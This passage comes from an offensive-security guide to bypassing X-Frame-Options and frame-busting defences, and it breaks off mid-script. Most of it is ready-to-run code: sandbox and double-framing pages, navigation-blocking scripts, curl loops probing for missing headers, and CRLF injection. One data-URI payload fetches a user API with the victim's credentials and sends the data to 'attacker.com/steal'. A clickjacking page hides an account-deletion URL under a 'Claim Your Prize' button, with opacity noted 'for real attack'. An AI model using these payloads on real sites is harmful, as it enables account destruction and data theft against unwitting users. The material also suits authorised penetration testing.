              onerror="this.nextElementSibling.innerHTML='❌ BLOCKED'">
          </iframe>
          <div class="result">⏳ Loading...</div>
      </div>

      <div class="test">
          <h4>Test 5: sandbox="allow-scripts allow-forms" (scripts enabled, busting may work)</h4>
          <iframe sandbox="allow-scripts allow-forms" src="https://target.com"
              width="800" height="100"
              onload="this.nextElementSibling.innerHTML='✅ LOADED (but scripts run)'"
              onerror="this.nextElementSibling.innerHTML='❌ BLOCKED'">
          </iframe>
          <div class="result">⏳ Loading...</div>
      </div>
  </body>
  </html>
  ```

  :::

  :::tabs-item{icon="i-lucide-shield-off" label="Double Framing"}

  ```html [Double Frame Bypass]
  <!--
    Some frame-busters check: if (top !== self)
    Double framing creates a chain: attacker → middle → target
    The target checks top (attacker page) vs self (target page)
    but some implementations check parent instead of top
  -->

  <!-- outer.html (attacker's main page) -->
  <!DOCTYPE html>
  <html>
  <head>
      <title>Outer Frame</title>
      <script>
          // Block any navigation attempts from inner frames
          window.onbeforeunload = function() { return "Stay?"; };
      </script>
  </head>
  <body>
      <iframe src="middle.html" width="100%" height="100%"
          style="border:none;">
      </iframe>
  </body>
  </html>

  <!-- middle.html (intermediate frame) -->
  <!DOCTYPE html>
  <html>
  <head>
      <script>
          // Block navigation from inner frame
          window.onbeforeunload = function() { return false; };

          // Continuously prevent location changes
          var loc = window.location.href;
          setInterval(function() {
              if (window.location.href !== loc) {
                  window.location.href = loc;
              }
          }, 1);
      </script>
  </head>
  <body>
      <iframe sandbox="allow-forms"
          src="https://target.com/action-page"
          width="100%" height="100%"
          style="border:none;">
      </iframe>
  </body>
  </html>
  ```

  :::

  :::tabs-item{icon="i-lucide-shield-off" label="onBeforeUnload Block"}

  ```html [Navigation Blocking Bypass]
  <!DOCTYPE html>
  <html>
  <head>
      <script>
          // Method 1: Block all navigation attempts
          window.onbeforeunload = function(e) {
              e.preventDefault();
              return '';
          };

          // Method 2: History flooding
          for (var i = 0; i < 200; i++) {
              history.pushState(null, '', window.location.href);
          }
          window.addEventListener('popstate', function() {
              history.pushState(null, '', window.location.href);
          });

          // Method 3: Constant location monitor
          var myLoc = window.location.href;
          setInterval(function() {
              if (window.location.href !== myLoc) {
                  window.location.href = myLoc;
              }
          }, 0);

          // Method 4: Override window.top for older busters
          // (only works in specific contexts)
          // var top = window.self;
      </script>
  </head>
  <body>
      <div style="position:relative;">
          <button style="padding:20px 50px; font-size:20px; position:relative; z-index:1;">
              Click Here to Continue
          </button>
          <iframe src="https://target.com/sensitive-action"
              style="position:absolute; top:0; left:0; width:100%; height:100%;
                     opacity:0; z-index:10; border:none;">
          </iframe>
      </div>
  </body>
  </html>
  ```

  :::

  :::tabs-item{icon="i-lucide-shield-off" label="204 No Content Trick"}

  ```html [204 Response Frame Buster Bypass]
  <!--
    Some frame-busters do: top.location = self.location
    If we make top.location assignment fail by pointing to a
    URL that returns 204 No Content, the navigation is silently ignored
  -->

  <!DOCTYPE html>
  <html>
  <head>
      <script>
          // Pre-set top.location to a 204 URL before the frame loads
          // This prevents the frame-buster from successfully navigating
          // (Only works in very specific legacy scenarios)
      </script>
  </head>
  <body>
      <!-- Method: Use about:blank as intermediate -->
      <iframe id="holder" src="about:blank" width="100%" height="600" style="border:none;">
      </iframe>
      <script>
          var f = document.getElementById('holder');
          // Write target URL into the about:blank frame
          f.contentDocument.write('<iframe src="https://target.com" width="100%" height="100%"></iframe>');
      </script>
  </body>
  </html>
  ```

  :::
::

---

### Bypass 8 — Inconsistent Per-Page Headers

Many applications set XFO on main pages but miss it on specific endpoints, error pages, API responses, or redirects.

```bash [Systematic Inconsistency Discovery]
# Test common missing endpoints

# Error pages
curl -sI "https://target.com/nonexistent-page-12345" | grep -i "x-frame"
curl -sI "https://target.com/api/nonexistent" | grep -i "x-frame"

# API endpoints (often serve JSON without security headers)
curl -sI "https://target.com/api/" | grep -i "x-frame"
curl -sI "https://target.com/api/v1/user" | grep -i "x-frame"
curl -sI "https://target.com/api/v2/profile" | grep -i "x-frame"
curl -sI "https://target.com/graphql" | grep -i "x-frame"

# Static file handlers
curl -sI "https://target.com/static/" | grep -i "x-frame"
curl -sI "https://target.com/assets/" | grep -i "x-frame"
curl -sI "https://target.com/media/" | grep -i "x-frame"
curl -sI "https://target.com/uploads/" | grep -i "x-frame"

# Authentication endpoints
curl -sI "https://target.com/login" | grep -i "x-frame"
curl -sI "https://target.com/register" | grep -i "x-frame"
curl -sI "https://target.com/forgot-password" | grep -i "x-frame"
curl -sI "https://target.com/sso/callback" | grep -i "x-frame"
curl -sI "https://target.com/oauth/authorize" | grep -i "x-frame"
curl -sI "https://target.com/oauth/callback" | grep -i "x-frame"

# Admin / Internal
curl -sI "https://target.com/admin" | grep -i "x-frame"
curl -sI "https://target.com/admin/login" | grep -i "x-frame"
curl -sI "https://target.com/internal/" | grep -i "x-frame"
curl -sI "https://target.com/debug/" | grep -i "x-frame"

# Embed / Widget endpoints (intentionally frameable)
curl -sI "https://target.com/embed" | grep -i "x-frame"
curl -sI "https://target.com/widget" | grep -i "x-frame"
curl -sI "https://target.com/iframe" | grep -i "x-frame"

# File types that might render without headers
curl -sI "https://target.com/page.html" | grep -i "x-frame"
curl -sI "https://target.com/page.php" | grep -i "x-frame"
curl -sI "https://target.com/page.aspx" | grep -i "x-frame"
curl -sI "https://target.com/page.jsp" | grep -i "x-frame"

# Redirect chain analysis
curl -sIL "https://target.com/old-page" 2>&1 | grep -iE "(x-frame|location:)"
# XFO might be set on final page but not on intermediate redirects

# Different subdomains
for sub in www app api admin portal mail dev staging beta; do
  echo -n "[$sub] "
  curl -sI "https://$sub.target.com" 2>/dev/null | grep -i "x-frame-options" || echo "NO XFO"
done
```

---

### Bypass 9 — Path / Parameter Manipulation

Some server-side implementations conditionally set XFO based on the requested path or parameters, which can be manipulated.

```bash [Path Manipulation Techniques]
# Trailing slash difference
curl -sI "https://target.com/settings" | grep -i "x-frame"
curl -sI "https://target.com/settings/" | grep -i "x-frame"

# Case variation
curl -sI "https://target.com/Settings" | grep -i "x-frame"
curl -sI "https://target.com/SETTINGS" | grep -i "x-frame"
curl -sI "https://target.com/sEtTiNgS" | grep -i "x-frame"

# Path traversal in URL
curl -sI "https://target.com/./settings" | grep -i "x-frame"
curl -sI "https://target.com/foo/../settings" | grep -i "x-frame"
curl -sI "https://target.com//settings" | grep -i "x-frame"
curl -sI "https://target.com/settings;a=b" | grep -i "x-frame"

# URL encoding
curl -sI "https://target.com/%73%65%74%74%69%6e%67%73" | grep -i "x-frame"
curl -sI "https://target.com/settings%00" | grep -i "x-frame"
curl -sI "https://target.com/settings%20" | grep -i "x-frame"
curl -sI "https://target.com/settings%2f" | grep -i "x-frame"

# Extension appending
curl -sI "https://target.com/settings.json" | grep -i "x-frame"
curl -sI "https://target.com/settings.xml" | grep -i "x-frame"
curl -sI "https://target.com/settings.html" | grep -i "x-frame"
curl -sI "https://target.com/settings.css" | grep -i "x-frame"

# Query parameter injection
curl -sI "https://target.com/settings?format=json" | grep -i "x-frame"
curl -sI "https://target.com/settings?callback=test" | grep -i "x-frame"
curl -sI "https://target.com/settings?_format=html" | grep -i "x-frame"
curl -sI "https://target.com/settings?embed=true" | grep -i "x-frame"
curl -sI "https://target.com/settings?iframe=1" | grep -i "x-frame"
curl -sI "https://target.com/settings?no_frame_check=1" | grep -i "x-frame"
curl -sI "https://target.com/settings?debug=1" | grep -i "x-frame"

# Fragment (shouldn't affect server but some frameworks parse it)
curl -sI "https://target.com/settings#iframe" | grep -i "x-frame"

# HTTP verb
curl -sI -X POST "https://target.com/settings" | grep -i "x-frame"
curl -sI -X OPTIONS "https://target.com/settings" | grep -i "x-frame"
curl -sI -X PUT "https://target.com/settings" | grep -i "x-frame"
```

```bash [Automated Path Mutation Testing]
#!/bin/bash
# xfo_path_bypass.sh - Test path mutations for XFO bypass
TARGET="$1"
BASE_PATH="${2:-/settings}"

echo "[*] Testing XFO bypass via path manipulation on $TARGET$BASE_PATH"

MUTATIONS=(
  "$BASE_PATH"
  "${BASE_PATH}/"
  "${BASE_PATH}/."
  "${BASE_PATH}/.."
  "${BASE_PATH}///"
  "${BASE_PATH}%00"
  "${BASE_PATH}%20"
  "${BASE_PATH}%0a"
  "${BASE_PATH}%0d"
  "${BASE_PATH};.css"
  "${BASE_PATH};.js"
  "${BASE_PATH}?.json"
  "${BASE_PATH}?embed=1"
  "${BASE_PATH}?iframe=true"
  "${BASE_PATH}?format=json"
  "${BASE_PATH}?callback=x"
  "${BASE_PATH}?debug=1"
  "${BASE_PATH}?no_xfo=1"
  "${BASE_PATH}.json"
  "${BASE_PATH}.xml"
  "${BASE_PATH}.html"
  "/./$(echo $BASE_PATH | sed 's|^/||')"
  "/a/../$(echo $BASE_PATH | sed 's|^/||')"
)

for mutation in "${MUTATIONS[@]}"; do
  url="${TARGET}${mutation}"
  result=$(curl -sI "$url" 2>/dev/null)
  status=$(echo "$result" | head -1 | awk '{print $2}')
  xfo=$(echo "$result" | grep -i "x-frame-options" | tr -d '\r\n' | xargs)

  if [ -z "$xfo" ] && [ "$status" = "200" ]; then
    echo "[BYPASS] $url → HTTP $status — NO XFO!"
  elif [ -n "$xfo" ]; then
    echo "[SAFE  ] $url → $xfo"
  else
    echo "[OTHER ] $url → HTTP $status"
  fi
done
```

---

### Bypass 10 — CDN / Proxy / Cache Header Stripping

Reverse proxies, CDNs, load balancers, and caching layers can strip or fail to forward XFO headers.

```bash [CDN / Proxy Detection]
# Identify infrastructure
dig +short target.com
nslookup target.com
whois $(dig +short target.com | head -1)

# Check for CDN indicators
curl -sI "https://target.com" | grep -iE "(server:|x-served-by|x-cache|cf-ray|x-amz|x-azure|x-cdn|via:|x-varnish|x-fastly|x-akamai)"

# Common CDN headers that indicate caching:
# CF-Ray: → Cloudflare
# X-Cache: Hit from cloudfront → AWS CloudFront
# X-Served-By: cache-xxx → Fastly / Varnish
# X-Akamai-Request-ID → Akamai
# X-Azure-Ref → Azure CDN
# Via: 1.1 varnish → Varnish Cache

# Check if cached vs uncached responses differ
curl -sI "https://target.com" -H "Cache-Control: no-cache" | grep -i "x-frame"
curl -sI "https://target.com" -H "Pragma: no-cache" | grep -i "x-frame"

# Force cache miss
curl -sI "https://target.com?_=$(date +%s)" | grep -i "x-frame"
curl -sI "https://target.com" -H "Cache-Control: max-age=0" | grep -i "x-frame"

# Check direct backend vs CDN
# If you can find the origin IP:
curl -sI "https://target.com" --resolve "target.com:443:ORIGIN_IP" | grep -i "x-frame"

# Cloudflare bypass attempts
curl -sI "https://target.com" -H "CF-Connecting-IP: 127.0.0.1" | grep -i "x-frame"
```

```bash [Proxy Header Injection]
# Some reverse proxies add/modify headers based on request headers
# Try injecting headers that might affect XFO behavior

curl -sI "https://target.com" \
  -H "X-Forwarded-For: 127.0.0.1" | grep -i "x-frame"

curl -sI "https://target.com" \
  -H "X-Original-URL: /embed" | grep -i "x-frame"

curl -sI "https://target.com" \
  -H "X-Rewrite-URL: /widget" | grep -i "x-frame"

curl -sI "https://target.com" \
  -H "X-Forwarded-Host: trusted-partner.com" | grep -i "x-frame"

curl -sI "https://target.com" \
  -H "X-Forwarded-Proto: http" | grep -i "x-frame"

curl -sI "https://target.com" \
  -H "X-Custom-IP-Authorization: 127.0.0.1" | grep -i "x-frame"

curl -sI "https://target.com" \
  -H "Host: embed.target.com" | grep -i "x-frame"

# Test all at once
for header in \
  "X-Forwarded-For: 127.0.0.1" \
  "X-Real-IP: 127.0.0.1" \
  "X-Original-URL: /" \
  "X-Rewrite-URL: /" \
  "X-Forwarded-Host: attacker.com" \
  "X-Forwarded-Proto: http" \
  "X-Custom-IP-Authorization: 127.0.0.1" \
  "X-Frame-Options: ALLOWALL" \
  "Origin: https://attacker.com" \
  "Referer: https://attacker.com"; do
  echo -n "[$header] → "
  curl -sI "https://target.com" -H "$header" 2>/dev/null | grep -i "x-frame-options" || echo "NO XFO"
done
```

---

### Bypass 11 — SAMEORIGIN Subdomain Exploitation

`X-Frame-Options: SAMEORIGIN` only allows framing from the exact same origin. If you can find or take over a subdomain, you can frame from there with `SAMEORIGIN` potentially behaving differently across browsers for subdomain contexts.

::caution
In modern browsers, `SAMEORIGIN` is strictly interpreted — `sub.target.com` is NOT the same origin as `target.com`. However, some older implementations or custom checks may treat subdomains as same-origin.
::

```bash [Subdomain Exploitation for SAMEORIGIN]
# Find subdomains
subfinder -d target.com -silent | tee subdomains.txt
amass enum -passive -d target.com | tee -a subdomains.txt
sort -u subdomains.txt -o subdomains.txt

# Check which subdomains are alive
cat subdomains.txt | httpx -silent -status-code -title | tee alive_subs.txt

# Check for subdomain takeover opportunities
subjack -w subdomains.txt -t 20 -o takeover.txt -ssl
nuclei -l subdomains.txt -tags takeover -severity high,critical

# Check for XSS on subdomains (can be chained with framing)
cat alive_subs.txt | cut -d' ' -f1 | gau | gf xss | tee xss_candidates.txt

# Check for open redirects on subdomains
cat alive_subs.txt | cut -d' ' -f1 | gau | gf redirect | tee redirect_candidates.txt

# If CSP uses: frame-ancestors 'self' *.target.com
# A compromised/taken-over subdomain can frame the main site
```

```bash [Subdomain Takeover Quick Checks]
# Check CNAME records for dangling references
cat subdomains.txt | while read sub; do
  cname=$(dig +short CNAME "$sub" | head -1)
  if [ -n "$cname" ]; then
    echo "$sub → $cname"
    # Check if CNAME target exists
    ip=$(dig +short "$cname" | head -1)
    if [ -z "$ip" ]; then
      echo "  [!!!] DANGLING CNAME — Possible takeover!"
    fi
  fi
done

# Check common services
# GitHub: *.github.io CNAME → check if 404
# S3: *.s3.amazonaws.com → check if NoSuchBucket
# Heroku: *.herokuapp.com → check if "No such app"
# Azure: *.azurewebsites.net → check if not found
```

---

### Bypass 12 — HTTP/HTTPS Downgrade

If the site is accessible over HTTP and XFO is only set on HTTPS responses, a MITM attacker can strip the header.

```bash [Protocol Downgrade Detection]
# Compare HTTP vs HTTPS headers
echo "=== HTTP ==="
curl -sI "http://target.com" | grep -iE "(x-frame|location|strict-transport)"
echo ""
echo "=== HTTPS ==="
curl -sI "https://target.com" | grep -iE "(x-frame|location|strict-transport)"

# Check if HTTP redirects to HTTPS
curl -sIL "http://target.com" 2>&1 | grep -iE "(location|x-frame)"

# Check HSTS
curl -sI "https://target.com" | grep -i "strict-transport-security"
# If no HSTS → HTTP downgrade + header stripping is possible via MITM

# If target allows HTTP:
# 1. MITM victim's connection
# 2. Proxy HTTP version (which may lack XFO)
# 3. Inject iframe on the HTTP page
# 4. Frame the target without XFO protection
```

---

### Bypass 13 — Content-Type Confusion

Some servers only add XFO to HTML responses but not to other content types that browsers still render.

```bash [Content-Type Tricks]
# Check if different content types get XFO
curl -sI "https://target.com" -H "Accept: text/html" | grep -i "x-frame"
curl -sI "https://target.com" -H "Accept: application/json" | grep -i "x-frame"
curl -sI "https://target.com" -H "Accept: application/xml" | grep -i "x-frame"
curl -sI "https://target.com" -H "Accept: text/plain" | grep -i "x-frame"
curl -sI "https://target.com" -H "Accept: */*" | grep -i "x-frame"

# Some APIs return HTML based on Accept header but miss XFO
curl -sI "https://target.com/api/data" -H "Accept: text/html" | grep -i "x-frame"

# JSONP endpoints that return executable JS/HTML
curl -sI "https://target.com/api/data?callback=test" | grep -i "x-frame"

# Check if SVG files (which can contain scripts) have XFO
curl -sI "https://target.com/image.svg" | grep -i "x-frame"

# PDF files (can be framed and may execute JS in some contexts)
curl -sI "https://target.com/document.pdf" | grep -i "x-frame"
```

---

### Bypass 14 — Browser-Specific Quirks

Different browsers handle edge cases differently.

::tabs
  :::tabs-item{icon="i-lucide-chrome" label="Chrome Specific"}

  ```bash [Chrome Behavior]
  # Chrome ignores ALLOW-FROM completely
  # Chrome ignores XFO if CSP frame-ancestors is present (CSP wins)
  # Chrome ignores XFO if value is invalid
  # Chrome ignores XFO if multiple conflicting headers exist

  # Chrome 91+: Removed support for ALLOW-FROM entirely
  # Chrome treats SAMEORIGIN strictly (same scheme + host + port)

  # Test in Chrome DevTools:
  # 1. Open target page
  # 2. Console: Check for "Refused to display in a frame" errors
  # 3. Network tab: Check response headers
  # 4. Security tab: Check CSP details
  ```

  :::

  :::tabs-item{icon="i-lucide-compass" label="Firefox Specific"}

  ```bash [Firefox Behavior]
  # Firefox 70+: Dropped ALLOW-FROM support
  # Firefox: If CSP frame-ancestors present, XFO is ignored
  # Firefox: Multiple XFO headers → may use first one only
  # Firefox: SAMEORIGIN checks are strict

  # Firefox about:config tweaks for testing:
  # security.csp.enable = false  (disable CSP temporarily)
  # This doesn't affect XFO but helps isolate which protection blocks framing

  # Test in Firefox DevTools:
  # Console > Look for "X-Frame-Options" error messages
  # Network > Response Headers > Check XFO and CSP values
  ```

  :::

  :::tabs-item{icon="i-lucide-globe" label="Safari & Edge"}

  ```bash [Safari / Edge Behavior]
  # Safari:
  # - ALLOW-FROM never supported
  # - If XFO is invalid → ignored (frameable)
  # - CSP frame-ancestors overrides XFO
  # - Multiple XFO headers → undefined behavior

  # Edge (Chromium):
  # - Same behavior as Chrome (Chromium-based)
  # - ALLOW-FROM ignored
  # - CSP overrides XFO

  # Edge (Legacy / EdgeHTML):
  # - Supported ALLOW-FROM
  # - No longer in use (auto-updates to Chromium Edge)

  # Internet Explorer 11 (legacy):
  # - Supports ALLOW-FROM
  # - Supports DENY and SAMEORIGIN
  # - Still used in some enterprise environments
  # - No CSP frame-ancestors support
  ```

  :::

  :::tabs-item{icon="i-lucide-smartphone" label="Mobile & WebView"}

  ```bash [Mobile / WebView Behavior]
  # Android WebView:
  # - May not enforce XFO depending on app implementation
  # - loadUrl() vs shouldOverrideUrlLoading() affects header handling
  # - Some apps disable XFO enforcement for embedded content

  # iOS WKWebView:
  # - Generally respects XFO
  # - But custom URL schemes might bypass

  # React Native WebView:
  # - May not enforce XFO by default
  # - Depends on webviewAllowsInlineMediaPlayback and other settings

  # Electron apps:
  # - May disable web security entirely
  # - webPreferences.webSecurity = false → XFO ignored

  # Test mobile UA to see if server sends different headers
  curl -sI "https://target.com" -A "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)" | grep -i "x-frame"
  ```

  :::
::

---

### Bypass 15 — Open Redirect Chain

Use an open redirect on the target's allowed domain to frame attacker-controlled content.

```bash [Open Redirect to XFO Bypass]
# If CSP: frame-ancestors 'self' https://target.com
# And target.com has an open redirect:
# https://target.com/redirect?url=https://attacker.com

# The redirect itself is from target.com (allowed origin)
# After redirect, attacker.com content loads in the iframe
# Some browsers may allow this depending on redirect timing

# Find open redirects on target
waybackurls target.com | grep -iE "(redirect|url=|next=|return=|goto=|dest=|rurl=|continue=)" | sort -u

# Test redirect candidates
curl -sI "https://target.com/redirect?url=https://attacker.com" | grep -i "location"
curl -sI "https://target.com/login?next=https://attacker.com" | grep -i "location"
curl -sI "https://target.com/oauth/callback?redirect_uri=https://attacker.com" | grep -i "location"
```

---

### Bypass 16 — Data URI & Blob Framing

```html [Data URI and Blob Framing Attempts]
<!--
  Some CSP configurations allow data: or blob: in frame-ancestors
  or don't account for these schemes
-->

<!-- Data URI frame (most browsers block cross-origin data: in iframes) -->
<iframe src="data:text/html,<h1>Framed Content</h1>
<script>fetch('https://target.com/api/user',{credentials:'include'})
.then(r=>r.text()).then(d=>new Image().src='https://attacker.com/steal?d='+btoa(d))
</script>">
</iframe>

<!-- Blob URL frame -->
<script>
var html = '<html><body><iframe src="https://target.com"></iframe></body></html>';
var blob = new Blob([html], {type: 'text/html'});
var url = URL.createObjectURL(blob);
var frame = document.createElement('iframe');
frame.src = url;
document.body.appendChild(frame);
</script>

<!-- srcdoc attribute (no external URL needed) -->
<iframe srcdoc="<iframe src='https://target.com' style='width:100%;height:500px;border:none;'></iframe>">
</iframe>
```

---

## Verification & PoC Framework

### Universal XFO Bypass PoC

```html [universal_xfo_bypass_poc.html]
<!DOCTYPE html>
<html>
<head>
    <title>XFO Bypass Verification</title>
    <style>
        body {
            background: #0d1117;
            color: #c9d1d9;
            font-family: 'Consolas', monospace;
            padding: 20px;
        }
        h1 { color: #58a6ff; }
        .test-section {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 8px;
            margin: 15px 0;
            padding: 15px;
        }
        .test-section h3 { color: #8b949e; margin: 0 0 10px 0; }
        iframe { border: 2px solid #30363d; border-radius: 4px; margin: 5px 0; }
        .status { padding: 3px 8px; border-radius: 3px; font-size: 12px; font-weight: bold; }
        .loaded { background: #238636; color: white; }
        .blocked { background: #da3633; color: white; }
        .pending { background: #d29922; color: black; }
        input[type="text"] {
            width: 70%;
            padding: 10px;
            background: #21262d;
            border: 1px solid #30363d;
            border-radius: 6px;
            color: #c9d1d9;
            font-size: 14px;
        }
        button {
            padding: 10px 20px;
            background: #238636;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-left: 10px;
        }
        button:hover { background: #2ea043; }
    </style>
</head>
<body>
    <h1>🔓 X-Frame-Options Bypass Tester</h1>
    <p>Enter target URL to test multiple bypass techniques</p>

    <div>
        <input type="text" id="targetUrl" placeholder="https://target.com/page">
        <button onclick="runTests()">Run All Tests</button>
    </div>

    <div id="results"></div>

    <script>
        function runTests() {
            var url = document.getElementById('targetUrl').value;
            if (!url) return;

            var tests = [
                {
                    name: "Standard iframe (no bypass)",
                    html: '<iframe src="' + url + '" width="100%" height="150"></iframe>'
                },
                {
                    name: "Sandbox (empty — blocks JS frame-busting)",
                    html: '<iframe sandbox src="' + url + '" width="100%" height="150"></iframe>'
                },
                {
                    name: "Sandbox allow-forms",
                    html: '<iframe sandbox="allow-forms" src="' + url + '" width="100%" height="150"></iframe>'
                },
                {
                    name: "Sandbox allow-forms allow-same-origin",
                    html: '<iframe sandbox="allow-forms allow-same-origin" src="' + url + '" width="100%" height="150"></iframe>'
                },
                {
                    name: "Sandbox allow-forms allow-same-origin allow-popups",
                    html: '<iframe sandbox="allow-forms allow-same-origin allow-popups" src="' + url + '" width="100%" height="150"></iframe>'
                },
                {
                    name: "Sandbox allow-scripts allow-forms",
                    html: '<iframe sandbox="allow-scripts allow-forms" src="' + url + '" width="100%" height="150"></iframe>'
                },
                {
                    name: "srcdoc nested iframe",
                    html: '<iframe srcdoc="<iframe src=\'' + url + '\' width=\'100%\' height=\'140\' style=\'border:none;\'></iframe>" width="100%" height="150"></iframe>'
                },
                {
                    name: "Trailing slash variation",
                    html: '<iframe src="' + url + '/" width="100%" height="150"></iframe>'
                },
                {
                    name: "Query parameter: ?embed=1",
                    html: '<iframe src="' + url + '?embed=1" width="100%" height="150"></iframe>'
                },
                {
                    name: "Query parameter: ?iframe=true",
                    html: '<iframe src="' + url + '?iframe=true" width="100%" height="150"></iframe>'
                },
                {
                    name: "Query parameter: ?format=json",
                    html: '<iframe src="' + url + '?format=json" width="100%" height="150"></iframe>'
                }
            ];

            var results = document.getElementById('results');
            results.innerHTML = '';

            tests.forEach(function(test, idx) {
                var section = document.createElement('div');
                section.className = 'test-section';
                section.innerHTML = '<h3>' + (idx+1) + '. ' + test.name +
                    ' <span class="status pending" id="status-' + idx + '">TESTING...</span></h3>' +
                    '<div id="frame-' + idx + '"></div>';
                results.appendChild(section);

                var frameDiv = document.getElementById('frame-' + idx);
                frameDiv.innerHTML = test.html;

                var iframe = frameDiv.querySelector('iframe');
                if (iframe) {
                    iframe.onload = function() {
                        document.getElementById('status-' + idx).className = 'status loaded';
                        document.getElementById('status-' + idx).textContent = 'LOADED ✓';
                    };
                    iframe.onerror = function() {
                        document.getElementById('status-' + idx).className = 'status blocked';
                        document.getElementById('status-' + idx).textContent = 'BLOCKED ✗';
                    };

                    // Timeout fallback
                    setTimeout(function() {
                        var s = document.getElementById('status-' + idx);
                        if (s && s.textContent === 'TESTING...') {
                            s.className = 'status blocked';
                            s.textContent = 'TIMEOUT / BLOCKED';
                        }
                    }, 8000);
                }
            });
        }
    </script>
</body>
</html>
```

### Clickjacking PoC After Bypass

```html [post_bypass_clickjack.html]
<!DOCTYPE html>
<html>
<head>
    <title>Click to Win!</title>
    <style>
        body {
            background: #0d1117;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .bait {
            text-align: center;
            position: relative;
        }
        .claim-btn {
            background: #e94560;
            color: white;
            border: none;
            padding: 20px 60px;
            font-size: 24px;
            border-radius: 12px;
            cursor: pointer;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        .target-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 10;
        }
        /* Set opacity to 0 for real attack, 0.3 for report demo */
        .target-frame { opacity: 0; }
        /* .target-frame { opacity: 0.3; } */
    </style>
</head>
<body>
    <div class="bait">
        <h1 style="margin-bottom:30px;">🎁 You've Won!</h1>
        <div style="position:relative; display:inline-block;">
            <button class="claim-btn">Claim Your Prize</button>
            <!--
                Use whichever bypass method works:
                - Standard iframe (if no XFO at all)
                - Sandbox iframe (if JS frame-busting only)
                - Specific path that lacks XFO
            -->
            <iframe class="target-frame"
                sandbox="allow-forms allow-same-origin"
                src="https://target.com/account/delete?confirm=true"
                scrolling="no">
            </iframe>
        </div>
    </div>
</body>
</html>
```

---

## Header Injection for XFO Removal

When you find header injection vulnerabilities (CRLF injection, response splitting), you can inject or override XFO headers.

```bash [CRLF Injection to Remove XFO]
# Test for CRLF injection in parameters
curl -sI "https://target.com/redirect?url=https://example.com%0d%0aX-Frame-Options:%20ALLOWALL" | grep -i "x-frame"
curl -sI "https://target.com/redirect?url=https://example.com%0d%0aX-Frame-Options:%20" | grep -i "x-frame"

# CRLF in headers
curl -sI "https://target.com" -H "X-Custom: value%0d%0aX-Frame-Options: ALLOWALL" | grep -i "x-frame"

# Parameter-based CRLF
curl -sI "https://target.com/page?lang=en%0d%0aX-Frame-Options:%20ALLOWALL%0d%0a" | grep -i "x-frame"

# URL path CRLF
curl -sI "https://target.com/%0d%0aX-Frame-Options:%20ALLOWALL%0d%0a" | grep -i "x-frame"

# Common CRLF injection points to test
PARAMS=(url redirect next return goto dest callback lang ref referer)
for param in "${PARAMS[@]}"; do
  result=$(curl -sI "https://target.com/?${param}=test%0d%0aX-Frame-Options:%20ALLOWALL" 2>/dev/null | grep -c "ALLOWALL")
  if [ "$result" -gt 0 ]; then
    echo "[CRLF VULN] Parameter: $param — Can inject XFO override!"
  fi
done

# Test with double encoding
curl -sI "https://target.com/redirect?url=test%250d%250aX-Frame-Options:%2520ALLOWALL" | grep -i "x-frame"
```

---

## Comprehensive Bypass Detection Script

```bash [full_xfo_bypass_audit.sh]
#!/bin/bash
# Full XFO Bypass Audit Script

TARGET="$1"

if [ -z "$TARGET" ]; then
  echo "Usage: $0 <target_url>"
  exit 1
fi

echo "=============================================="
echo "X-Frame-Options Bypass Audit: $TARGET"
echo "=============================================="
echo ""

# 1. Basic header check
echo "[1] Basic Header Analysis"
echo "========================="
HEADERS=$(curl -sI "$TARGET" 2>/dev/null)
XFO=$(echo "$HEADERS" | grep -i "x-frame-options" | tr -d '\r')
CSP=$(echo "$HEADERS" | grep -i "content-security-policy" | tr -d '\r')
CSP_RO=$(echo "$HEADERS" | grep -i "content-security-policy-report-only" | tr -d '\r')
FA=$(echo "$CSP" | grep -oi "frame-ancestors[^;]*")

echo "XFO: ${XFO:-NOT SET}"
echo "CSP FA: ${FA:-NOT SET}"
echo "CSP Report-Only: ${CSP_RO:+PRESENT}"
echo ""

# 2. XFO value validation
echo "[2] XFO Value Validation"
echo "========================"
XFO_VAL=$(echo "$XFO" | cut -d: -f2- | xargs | tr '[:lower:]' '[:upper:]' 2>/dev/null)
case "$XFO_VAL" in
  "DENY") echo "  ✅ Valid: DENY" ;;
  "SAMEORIGIN") echo "  ✅ Valid: SAMEORIGIN" ;;
  ALLOW-FROM*) echo "  ⚠️  DEPRECATED: $XFO_VAL (ignored by modern browsers)" ;;
  "") echo "  ❌ MISSING: No X-Frame-Options header" ;;
  *) echo "  ❌ INVALID VALUE: '$XFO_VAL' (browsers will ignore)" ;;
esac
echo ""

# 3. Duplicate header check
echo "[3] Duplicate Header Check"
echo "=========================="
XFO_COUNT=$(echo "$HEADERS" | grep -ci "x-frame-options")
if [ "$XFO_COUNT" -gt 1 ]; then
  echo "  ⚠️  MULTIPLE XFO HEADERS ($XFO_COUNT) — conflicting values may cause bypass"
  echo "$HEADERS" | grep -i "x-frame-options"
else
  echo "  ✅ Single XFO header (or none)"
fi
echo ""

# 4. CSP override check
echo "[4] CSP Override Check"
echo "======================"
if [ -n "$XFO" ] && [ -n "$FA" ]; then
  echo "  Both XFO and CSP frame-ancestors present"
  echo "  CSP takes precedence in all modern browsers"
  echo "  XFO: $XFO"
  echo "  CSP: $FA"
  echo "$FA" | grep -q '\*' && echo "  ⚠️  CSP frame-ancestors: * OVERRIDES restrictive XFO!"
fi
if [ -n "$CSP_RO" ] && [ -z "$XFO" ]; then
  echo "  ⚠️  frame-ancestors only in Report-Only CSP — NOT enforced!"
fi
echo ""

# 5. Meta tag check
echo "[5] Meta Tag CSP Check"
echo "======================"
BODY=$(curl -s "$TARGET" 2>/dev/null)
META_FA=$(echo "$BODY" | grep -iE '<meta[^>]*content-security-policy[^>]*frame-ancestors')
if [ -n "$META_FA" ]; then
  echo "  ⚠️  frame-ancestors found in <meta> tag — IGNORED by browsers!"
  echo "  $META_FA"
else
  echo "  ✅ No frame-ancestors in meta tags"
fi
echo ""

# 6. JS Frame-busting check
echo "[6] JavaScript Frame-Busting Check"
echo "==================================="
if echo "$BODY" | grep -qiE "(top\.location|window\.top|frameElement|framekiller)"; then
  echo "  ⚠️  JS frame-busting detected — bypassable with sandbox attribute"
  echo "  Patterns found:"
